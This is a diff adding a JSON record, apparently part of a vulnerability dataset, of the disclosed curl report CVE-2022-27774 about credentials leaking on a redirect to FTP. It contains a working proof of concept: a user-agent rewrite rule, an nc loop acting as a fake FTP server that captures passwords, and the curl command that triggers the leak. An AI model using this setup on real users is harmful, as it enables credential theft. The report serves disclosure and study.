@@ -1,0 +1,38 @@
+{
+  "reported_to": "curl",
+  "reported_by": "nyymi ",
+  "title": "CVE-2022-27774: Credential leak on redirect",
+  "content": "\nSummary:\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.\nSteps To Reproduce:\nRewriteCond %{HTTP_USER_AGENT} \"^curl/\"\n\nwhile true; do echo -e \"220 pocftp\\n331 plz\\n530 bye\" | nc -v -l -p 9999; done\ncurl -L --user foo https://firstsite.tld/redirectpoc\nThe entered password is visible in the fake FTP server:\nCode 95 Bytes\n1Listening on 0.0.0.0 9999\n2Connection received on somehost someport\n3USER foo\n4PASS secretpassword\nThere are several issues here:\nThe credentials are sent to a completely different host than the original host (firstsite.tld vs secondsite.tld). This is definitely not what the user could expect, considering the documentation says:\nWhen authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.\nThe redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.\nI believe the credentials should not be sent in this case unless if --location-trusted is used.\nIt might even be sensible to consider making curl stop sending credentials over downgraded security by default even when --location-trusted is used. Maybe there could be some option that could be used to enable such downgrade if the user REALLY wants it.\nImpact\nLeak of confidential information (user credentials).\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Insufficiently Protected Credentials"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1651067880,
+  "report_url": "https://hackerone.com/reports/1543773",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Set up a fake FTP server to listen for connections: `while true; do echo -e \"220 pocftp\\n331 plz\\n530 bye\" | nc -v -l -p 9999; done`"
+    ],
+    [
+      2,
+      "Execute curl with credentials and follow redirect: `curl -L --user foo https://firstsite.tld/redirectpoc`"
+    ]
+  ],
+  "vuln_description": "Curl can be tricked into leaking user credentials to a third-party host via an HTTP redirect to an FTP URL. This occurs even when the original request is made over HTTPS, leading to credentials being sent over an insecure channel (FTP) to a different host than intended.",
+  "reason": "The vulnerability involves understanding curl's behavior with redirects and credentials, specifically how it handles cross-protocol (HTTPS to FTP) and cross-host redirects. The attack requires setting up a listening FTP server to capture credentials, but the interaction between curl's redirect handling and credential transmission is not immediately obvious.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
